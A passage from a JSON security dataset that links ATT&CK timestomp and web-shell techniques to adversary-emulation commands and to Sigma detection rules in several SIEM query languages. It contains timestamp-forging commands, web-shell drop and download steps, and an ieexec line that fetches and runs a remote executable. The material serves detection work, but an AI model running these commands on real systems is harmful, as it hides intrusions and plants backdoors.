C:\\Some\\file.txt | % { $_.CreationTime = #{target_date_time} }\n", "powershell.exe Get-ChildItem C:\\Some\\file.txt | % { $_.CreationTime = 1970-01-01 00:00:00 }\n", "powershell.exe Get-ChildItem C:\\Some\\file.txt | % { $_.LastWriteTime = #{target_date_time} }\n", "powershell.exe Get-ChildItem C:\\Some\\file.txt | % { $_.LastWriteTime = 1970-01-01 00:00:00 }\n", "powershell.exe Get-ChildItem C:\\Some\\file.txt | % { $_.LastAccessTime = #{target_date_time} }\n", "powershell.exe Get-ChildItem C:\\Some\\file.txt | % { $_.LastAccessTime = 1970-01-01 00:00:00 }\n", "powershell/management/timestomp", "powershell/management/timestomp"], "technique_id": "T1099", "parsed_datasets": [{"Atomic Red Team Test - Timestomp": {"display_name": "Timestomp", "atomic_tests": [{"description": "Stomps on the access timestamp of a file\n", "supported_platforms": ["linux", "macos"], "name": "Set a file's access timestamp", "input_arguments": {"target_filename": {"default": "/opt/filename", "type": "Path", "description": "Path of file that we are going to stomp on last access time"}}, "executor": {"command": "touch -a -t 197001010000.00 #{target_filename}\n", "name": "sh"}}, {"description": "Stomps on the modification timestamp of a file\n", "supported_platforms": ["linux", "macos"], "name": "Set a file's modification timestamp", "input_arguments": {"target_filename": {"default": "/opt/filename", "type": "Path", "description": "Path of file that we are going to stomp on last access time"}}, "executor": {"command": "touch -m -t 197001010000.00 #{target_filename}\n", "name": "sh"}}, {"description": "Stomps on the create timestamp of a file\n\nSetting the creation timestamp requires changing the system clock and reverting.\nSudo or root privileges are required to change date. Use with caution.\n", "supported_platforms": ["linux", "macos"], "name": "Set a file's creation timestamp", "input_arguments": {"target_filename": {"default": "/opt/filename", "type": "Path", "description": "Path of file that we are going to stomp on last access time"}}, "executor": {"command": "NOW=$(date)\ndate -s \"1970-01-01 00:00:00\"\ntouch #{target_filename}\ndate -s \"$NOW\"\nstat #{target_filename}\n", "name": "sh"}}, {"description": "Modifies the `modify` and `access` timestamps using the timestamps of a specified reference file.\n\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n", "supported_platforms": ["linux", "macos"], "name": "Modify file timestamps using reference file", "input_arguments": {"reference_file_path": {"default": "/bin/sh", "type": "Path", "description": "Path of reference file to read timestamps from"}, "target_file_path": {"default": "/opt/filename", "type": "Path", "description": "Path of file to modify timestamps of"}}, "executor": {"command": "touch -acmr #{reference_file_path} {target_file_path}\n", "name": "sh"}}, {"description": "Modifies the file creation timestamp of a specified file.\n\nThis technique was seen in use by the Stitch RAT.\n", "supported_platforms": ["windows"], "name": "Windows - Modify file creation timestamp with PowerShell", "input_arguments": {"file_path": {"default": "C:\\Some\\file.txt", "type": "Path", "description": "Path of file to change creation timestamp"}, "target_date_time": {"default": "1970-01-01 00:00:00", "type": "String", "description": "Date/time to replace original timestamps with"}}, "executor": {"elevation_required": false, "command": "powershell.exe Get-ChildItem #{file_path} | % { $_.CreationTime = #{target_date_time} }\n", "name": "command_prompt"}}, {"description": "Modifies the file last modified timestamp of a specified file.\n\nThis technique was seen in use by the Stitch RAT.\n", "supported_platforms": ["windows"], "name": "Windows - Modify file last modified timestamp with PowerShell", "input_arguments": {"file_path": {"default": "C:\\Some\\file.txt", "type": "Path", "description": "Path of file to change last modified timestamp"}, "target_date_time": {"default": "1970-01-01 00:00:00", "type": "String", "description": "Date/time to replace original timestamps with"}}, "executor": {"elevation_required": false, "command": "powershell.exe Get-ChildItem #{file_path} | % { $_.LastWriteTime = #{target_date_time} }\n", "name": "command_prompt"}}, {"description": "Modifies the last access timestamp of a specified file.\n\nThis technique was seen in use by the Stitch RAT.\n", "supported_platforms": ["windows"], "name": "Windows - Modify file last access timestamp with PowerShell", "input_arguments": {"file_path": {"default": "C:\\Some\\file.txt", "type": "Path", "description": "Path of file to change last access timestamp"}, "target_date_time": {"default": "1970-01-01 00:00:00", "type": "String", "description": "Date/time to replace original timestamps with"}}, "executor": {"elevation_required": false, "command": "powershell.exe Get-ChildItem #{file_path} | % { $_.LastAccessTime = #{target_date_time} }\n", "name": "command_prompt"}}], "attack_technique": "T1099"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1099", "Empire Module": "powershell/management/timestomp", "Technique": "Timestomp", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/timestomp\":  [\"T1099\"],"}}], "queries": [{"query": "title: Unauthorized System Time Modification\nid: faa031b5-21ed-4e02-8881-2591f98d82ed\nstatus: experimental\ndescription: Detect scenarios where a potentially unauthorized application or user is modifying the system time.\nauthor: '@neu5ron'\nreferences:\n    - Private Cuckoo Sandbox (from many years ago, no longer have hash, NDA as well)\n    - Live environment caused by malware\ndate: 2019/02/05\ntags:\n    - attack.defense_evasion\n    - attack.t1099\nlogsource:\n    product: windows\n    service: security\n    definition: 'Requirements: Audit Policy : System > Audit Security State Change, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\System\\Audit Security State Change'\ndetection:\n    selection:\n        EventID: 4616\n    filter1:\n        ProcessName: 'C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe'\n    filter2:\n        ProcessName: 'C:\\Windows\\System32\\VBoxService.exe'\n    filter3:\n        ProcessName: 'C:\\Windows\\System32\\svchost.exe'\n        SubjectUserSid: 'S-1-5-19'\n    condition: selection and not ( filter1 or filter2 or filter3 )\nfalsepositives:\n    - HyperV or other virtualization technologies with binary not listed in filter portion of detection\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Unauthorized System Time Modification\nid: faa031b5-21ed-4e02-8881-2591f98d82ed\nstatus: experimental\ndescription: Detect scenarios where a potentially unauthorized application or user is modifying the system time.\nauthor: '@neu5ron'\nreferences:\n    - Private Cuckoo Sandbox (from many years ago, no longer have hash, NDA as well)\n    - Live environment caused by malware\ndate: 2019/02/05\ntags:\n    - attack.defense_evasion\n    - attack.t1099\nlogsource:\n    product: windows\n    service: security\n    definition: 'Requirements: Audit Policy : System > Audit Security State Change, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\System\\Audit Security State Change'\ndetection:\n    selection:\n        EventID: 4616\n    filter1:\n        ProcessName: 'C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe'\n    filter2:\n        ProcessName: 'C:\\Windows\\System32\\VBoxService.exe'\n    filter3:\n        ProcessName: 'C:\\Windows\\System32\\svchost.exe'\n        SubjectUserSid: 'S-1-5-19'\n    condition: selection and not ( filter1 or filter2 or filter3 )\nfalsepositives:\n    - HyperV or other virtualization technologies with binary not listed in filter portion of detection\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4616\" AND (NOT (((ProcessName:\"C\\\\:\\\\\\\\Program\\\\ Files\\\\\\\\VMware\\\\\\\\VMware\\\\ Tools\\\\\\\\vmtoolsd.exe\" OR ProcessName:\"C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\VBoxService.exe\") OR (ProcessName:\"C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\" AND SubjectUserSid:\"S\\\\-1\\\\-5\\\\-19\")))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Unauthorized-System-Time-Modification <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Unauthorized System Time Modification\",\\n    \"description\": \"Detect scenarios where a potentially unauthorized application or user is modifying the system time.\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1099\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4616\\\\\" AND (NOT (((ProcessName:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Program\\\\\\\\ Files\\\\\\\\\\\\\\\\VMware\\\\\\\\\\\\\\\\VMware\\\\\\\\ Tools\\\\\\\\\\\\\\\\vmtoolsd.exe\\\\\" OR ProcessName:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\VBoxService.exe\\\\\") OR (ProcessName:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\svchost.exe\\\\\" AND SubjectUserSid:\\\\\"S\\\\\\\\-1\\\\\\\\-5\\\\\\\\-19\\\\\")))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4616\\\\\" AND (NOT (((ProcessName:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Program\\\\\\\\ Files\\\\\\\\\\\\\\\\VMware\\\\\\\\\\\\\\\\VMware\\\\\\\\ Tools\\\\\\\\\\\\\\\\vmtoolsd.exe\\\\\" OR ProcessName:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\VBoxService.exe\\\\\") OR (ProcessName:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\svchost.exe\\\\\" AND SubjectUserSid:\\\\\"S\\\\\\\\-1\\\\\\\\-5\\\\\\\\-19\\\\\")))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Unauthorized System Time Modification\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4616\" AND (NOT (((ProcessName:\"C\\\\:\\\\\\\\Program Files\\\\\\\\VMware\\\\\\\\VMware Tools\\\\\\\\vmtoolsd.exe\" OR ProcessName:\"C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\VBoxService.exe\") OR (ProcessName:\"C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\" AND SubjectUserSid:\"S\\\\-1\\\\-5\\\\-19\")))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4616\" NOT (((ProcessName=\"C:\\\\\\\\Program Files\\\\\\\\VMware\\\\\\\\VMware Tools\\\\\\\\vmtoolsd.exe\" OR ProcessName=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\VBoxService.exe\") OR (ProcessName=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\" SubjectUserSid=\"S-1-5-19\"))))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4616\"  -((event_source=\"Microsoft-Windows-Security-Auditing\" ((ProcessName=\"C:\\\\\\\\Program Files\\\\\\\\VMware\\\\\\\\VMware Tools\\\\\\\\vmtoolsd.exe\" OR ProcessName=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\VBoxService.exe\") OR (ProcessName=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\" SubjectUserSid=\"S-1-5-19\")))))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4616)(?=.*(?!.*(?:.*(?:.*(?:.*(?:.*(?:.*C:\\\\Program Files\\\\VMware\\\\VMware Tools\\\\vmtoolsd\\\\.exe|.*C:\\\\Windows\\\\System32\\\\VBoxService\\\\.exe))|.*(?:.*(?=.*C:\\\\Windows\\\\System32\\\\svchost\\\\.exe)(?=.*S-1-5-19))))))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1100/T1100.yaml", "command": "xcopy #{web_shells} C:\\inetpub\\wwwroot\n", "name": null}, {"source": "atomics/T1100/T1100.yaml", "command": "xcopy PathToAtomicsFolder\\T1100\\src\\ C:\\inetpub\\wwwroot\n", "name": null}, {"source": "Threat Hunting Tables", "command": "ieexec.exe http://*:8080/bypass.exe", "name": null}], "command_list": ["xcopy #{web_shells} C:\\inetpub\\wwwroot\n", "xcopy PathToAtomicsFolder\\T1100\\src\\ C:\\inetpub\\wwwroot\n", "ieexec.exe http://*:8080/bypass.exe"], "technique_id": "T1100", "parsed_datasets": [{"Atomic Red Team Test - Web Shell": {"display_name": "Web Shell", "atomic_tests": [{"dependencies": [{"description": "Web shell must exist on disk at specified location (#{web_shells})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{web_shells}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/b.jsp\" -OutFile \"#{web_shells}/b.jsp\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/tests.jsp\" -OutFile \"#{web_shells}/test.jsp\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/cmd.aspx\" -OutFile \"#{web_shells}/cmd.aspx\"\n", "prereq_command": "if (Test-Path #{web_shells}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Web Shell Written to Disk", "executor": {"command": "xcopy #{web_shells} #{web_shell_path}\n", "name": "command_prompt", "cleanup_command": "del #{web_shell_path} >nul 2>&1\n"}, "description": "This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.\nIdea from APTSimulator.\ncmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n", "input_arguments": {"web_shell_path": {"default": "C:\\inetpub\\wwwroot", "type": "string", "description": "The path to drop the web shell"}, "web_shells": {"default": "PathToAtomicsFolder\\T1100\\src\\", "type": "path", "description": "Path of Web Shell"}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1100"}}, {"Threat Hunting Tables": {"mitre_attack": "T1100", "file_value": "", "file_path": "", "parent_process": "ieexec.exe", "itw_sample": "https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Ieexec.md", "chain_id": "100211", "registry_value": "", "mitre_caption": "web_shell", "registry_path": "", "frequency": "rare", "commandline_string": "http://*:8080/bypass.exe", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"0xtf/nsm-attack": {"Rules": "ET Open", "SID": "*", "Verified": "Yes", "Signature": "ET WEB_SERVER ATTACKER WebShell"}}], "queries": [{"query": "title: Antivirus Web Shell Detection\nid: fdf135a2-9241-4f96-a114-bb404948f736\ndescription: Detects a highly relevant Antivirus alert that reports a web shell\ndate: 2018/09/09\nmodified: 2019/10/04\nauthor: Florian Roth\nreferences:\n    - https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/\ntags:\n    - attack.persistence\n    - attack.t1100\nlogsource:\n    product: antivirus\ndetection:\n    selection:\n        Signature: \n            - \"PHP/Backdoor*\"\n            - \"JSP/Backdoor*\"\n            - \"ASP/Backdoor*\"\n            - \"Backdoor.PHP*\"\n            - \"Backdoor.JSP*\"\n            - \"Backdoor.ASP*\"\n            - \"*Webshell*\"\n    condition: selection\nfields:\n    - FileName\n    - User\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Antivirus Web Shell Detection\nid: fdf135a2-9241-4f96-a114-bb404948f736\ndescription: Detects a highly relevant Antivirus alert that reports a web shell\ndate: 2018/09/09\nmodified: 2019/10/04\nauthor: Florian Roth\nreferences:\n    - https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/\ntags:\n    - attack.persistence\n    - attack.t1100\nlogsource:\n    product: antivirus\ndetection:\n    selection:\n        Signature: \n            - \"PHP/Backdoor*\"\n            - \"JSP/Backdoor*\"\n            - \"ASP/Backdoor*\"\n            - \"Backdoor.PHP*\"\n            - \"Backdoor.JSP*\"\n            - \"Backdoor.ASP*\"\n            - \"*Webshell*\"\n    condition: selection\nfields:\n    - FileName\n    - User\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Signature.keyword:(PHP\\\\/Backdoor* OR JSP\\\\/Backdoor* OR ASP\\\\/Backdoor* OR Backdoor.PHP* OR Backdoor.JSP* OR Backdoor.ASP* OR *Webshell*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Antivirus-Web-Shell-Detection <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Antivirus Web Shell Detection\",\\n    \"description\": \"Detects a highly relevant Antivirus alert that reports a web shell\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1100\"\\n    ],\\n    \"query\": \"Signature.keyword:(PHP\\\\\\\\/Backdoor* OR JSP\\\\\\\\/Backdoor* OR ASP\\\\\\\\/Backdoor* OR Backdoor.PHP* OR Backdoor.JSP* OR Backdoor.ASP* OR *Webshell*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Signature.keyword:(PHP\\\\\\\\/Backdoor* OR JSP\\\\\\\\/Backdoor* OR ASP\\\\\\\\/Backdoor* OR Backdoor.PHP* OR Backdoor.JSP* OR Backdoor.ASP* OR *Webshell*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Antivirus Web Shell Detection\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\nFileName = {{_source.FileName}}\\\\n    User = {{_source.User}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Signature.keyword:(PHP\\\\/Backdoor* JSP\\\\/Backdoor* ASP\\\\/Backdoor* Backdoor.PHP* Backdoor.JSP* Backdoor.ASP* *Webshell*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Signature=\"PHP/Backdoor*\" OR Signature=\"JSP/Backdoor*\" OR Signature=\"ASP/Backdoor*\" OR Signature=\"Backdoor.PHP*\" OR Signature=\"Backdoor.JSP*\" OR Signature=\"Backdoor.ASP*\" OR Signature=\"*Webshell*\") | table FileName,User", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "Signature IN [\"PHP/Backdoor*\", \"JSP/Backdoor*\", \"ASP/Backdoor*\", \"Backdoor.PHP*\", \"Backdoor.JSP*\", \"Backdoor.ASP*\", \"*Webshell*\"]", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*PHP/Backdoor.*|.*JSP/Backdoor.*|.*ASP/Backdoor.*|.*Backdoor\\\\.PHP.*|.*Backdoor\\\\.JSP.*|.*Backdoor\\\\.ASP.*|.*.*Webshell.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Windows webshell creation\nid: 39f1f9f2-9636-45de-98f6-a4046aa8e4b9\nstatus: experimental\ndescription: Posible webshell file creation on a static web site\nreferences:\n    - PT ESC rule and personal experience\nauthor: Beyu Denis, oscd.community\ndate: 2019/10/22\nmodified: 2019/11/04\ntags:\n    - attack.persistence\n    - attack.t1100\nlevel: critical\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection_1:\n        EventID: 11\n    selection_2:\n        TargetFilename|contains: '\\inetpub\\wwwroot\\'\n    selection_3:        \n        TargetFilename|contains:\n            - '.asp'\n            - '.ashx'\n            - '.ph'\n    selection_4: \n        TargetFilename|contains:\n            - '\\www\\'\n            - '\\htdocs\\'\n            - '\\html\\'\n    selection_5:\n        TargetFilename|contains: '.ph'\n    selection_6:\n        - TargetFilename|contains|all: \n            - '\\'\n            - '.jsp'\n        - TargetFilename|contains|all: \n            - '\\cgi-bin\\'\n            - '.pl'\n    condition: selection_1 and ( selection_2 and selection_3 ) or\n               selection_1 and ( selection_4 and selection_5 ) or\n               selection_1 and selection_6\nfalsepositives:\n    - Legitimate administrator or developer creating legitimate executable files in a web application folder", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Windows webshell creation\nid: 39f1f9f2-9636-45de-98f6-a4046aa8e4b9\nstatus: experimental\ndescription: Posible webshell file creation on a static web site\nreferences:\n    - PT ESC rule and personal experience\nauthor: Beyu Denis, oscd.community\ndate: 2019/10/22\nmodified: 2019/11/04\ntags:\n    - attack.persistence\n    - attack.t1100\nlevel: critical\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection_1:\n        EventID: 11\n    selection_2:\n        TargetFilename|contains: '\\inetpub\\wwwroot\\'\n    selection_3:        \n        TargetFilename|contains:\n            - '.asp'\n            - '.ashx'\n            - '.ph'\n    selection_4: \n        TargetFilename|contains:\n            - '\\www\\'\n            - '\\htdocs\\'\n            - '\\html\\'\n    selection_5:\n        TargetFilename|contains: '.ph'\n    selection_6:\n        - TargetFilename|contains|all: \n            - '\\'\n            - '.jsp'\n        - TargetFilename|contains|all: \n            - '\\cgi-bin\\'\n            - '.pl'\n    condition: selection_1 and ( selection_2 and selection_3 ) or\n               selection_1 and ( selection_4 and selection_5 ) or\n               selection_1 and selection_6\nfalsepositives:\n    - Legitimate administrator or developer creating legitimate executable files in a web application folder", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"11\" AND ((TargetFilename.keyword:*\\\\\\\\inetpub\\\\\\\\wwwroot\\\\* AND TargetFilename.keyword:(*.asp* OR *.ashx* OR *.ph*)) OR (TargetFilename.keyword:(*\\\\\\\\www\\\\* OR *\\\\\\\\htdocs\\\\* OR *\\\\\\\\html\\\\*) AND TargetFilename.keyword:*.ph*) OR (TargetFilename.keyword:*\\\\* AND TargetFilename.keyword:*.jsp*) OR (TargetFilename.keyword:*\\\\\\\\cgi\\\\-bin\\\\* AND TargetFilename.keyword:*.pl*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Windows-webshell-creation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Windows webshell creation\",\\n    \"description\": \"Posible webshell file creation on a static web site\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1100\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"11\\\\\" AND ((TargetFilename.keyword:*\\\\\\\\\\\\\\\\inetpub\\\\\\\\\\\\\\\\wwwroot\\\\\\\\* AND TargetFilename.keyword:(*.asp* OR *.ashx* OR *.ph*)) OR (TargetFilename.keyword:(*\\\\\\\\\\\\\\\\www\\\\\\\\* OR *\\\\\\\\\\\\\\\\htdocs\\\\\\\\* OR *\\\\\\\\\\\\\\\\html\\\\\\\\*) AND TargetFilename.keyword:*.ph*) OR (TargetFilename.keyword:*\\\\\\\\* AND TargetFilename.keyword:*.jsp*) OR (TargetFilename.keyword:*\\\\\\\\\\\\\\\\cgi\\\\\\\\-bin\\\\\\\\* AND TargetFilename.keyword:*.pl*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"11\\\\\" AND ((TargetFilename.keyword:*\\\\\\\\\\\\\\\\inetpub\\\\\\\\\\\\\\\\wwwroot\\\\\\\\* AND TargetFilename.keyword:(*.asp* OR *.ashx* OR *.ph*)) OR (TargetFilename.keyword:(*\\\\\\\\\\\\\\\\www\\\\\\\\* OR *\\\\\\\\\\\\\\\\htdocs\\\\\\\\* OR *\\\\\\\\\\\\\\\\html\\\\\\\\*) AND TargetFilename.keyword:*.ph*) OR (TargetFilename.keyword:*\\\\\\\\* AND TargetFilename.keyword:*.jsp*) OR (TargetFilename.keyword:*\\\\\\\\\\\\\\\\cgi\\\\\\\\-bin\\\\\\\\* AND TargetFilename.keyword:*.pl*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Windows webshell creation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"11\" AND ((TargetFilename.keyword:*\\\\\\\\inetpub\\\\\\\\wwwroot\\\\* AND TargetFilename.keyword:(*.asp* *.ashx* *.ph*)) OR (TargetFilename.keyword:(*\\\\\\\\www\\\\* *\\\\\\\\htdocs\\\\* *\\\\\\\\html\\\\*) AND TargetFilename.keyword:*.ph*) OR (TargetFilename.keyword:*\\\\* AND TargetFilename.keyword:*.jsp*) OR (TargetFilename.keyword:*\\\\\\\\cgi\\\\-bin\\\\* AND TargetFilename.keyword:*.pl*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"11\" ((TargetFilename=\"*\\\\\\\\inetpub\\\\\\\\wwwroot\\\\*\" (TargetFilename=\"*.asp*\" OR TargetFilename=\"*.ashx*\" OR TargetFilename=\"*.ph*\")) OR ((TargetFilename=\"*\\\\\\\\www\\\\*\" OR TargetFilename=\"*\\\\\\\\htdocs\\\\*\" OR TargetFilename=\"*\\\\\\\\html\\\\*\") TargetFilename=\"*.ph*\") OR (TargetFilename=\"*\\\\*\" TargetFilename=\"*.jsp*\") OR (TargetFilename=\"*\\\\\\\\cgi-bin\\\\*\" TargetFilename=\"*.pl*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"11\" ((TargetFilename=\"*\\\\\\\\inetpub\\\\\\\\wwwroot\\\\*\" TargetFilename IN [\"*.asp*\", \"*.ashx*\", \"*.ph*\"]) OR (TargetFilename IN [\"*\\\\\\\\www\\\\*\", \"*\\\\\\\\htdocs\\\\*\", \"*\\\\\\\\html\\\\*\"] TargetFilename=\"*.ph*\") OR (TargetFilename=\"*\\\\*\" TargetFilename=\"*.jsp*\") OR (TargetFilename=\"*\\\\\\\\cgi-bin\\\\*\" TargetFilename=\"*.pl*\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*11)(?=.*(?:.*(?:.*(?:.*(?=.*.*\\\\inetpub\\\\wwwroot\\\\.*)(?=.*(?:.*.*\\\\.asp.*|.*.*\\\\.ashx.*|.*.*\\\\.ph.*)))|.*(?:.*(?=.*(?:.*.*\\\\www\\\\.*|.*.*\\\\htdocs\\\\.*|.*.*\\\\html\\\\.*))(?=.*.*\\\\.ph.*))|.*(?:.*(?=.*.*\\\\.*)(?=.*.*\\\\.jsp.*))|.*(?:.*(?=.*.*\\\\cgi-bin\\\\.*)(?=.*.*\\\\.pl.*))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Execution in Webserver Root Folder\nid: 35efb964-e6a5-47ad-bbcd-19661854018d\nstatus: experimental\ndescription: Detects a suspicious program execution in a web service root folder (filter out false positives)\nauthor: Florian Roth\ntags:\n    - attack.persistence\n    - 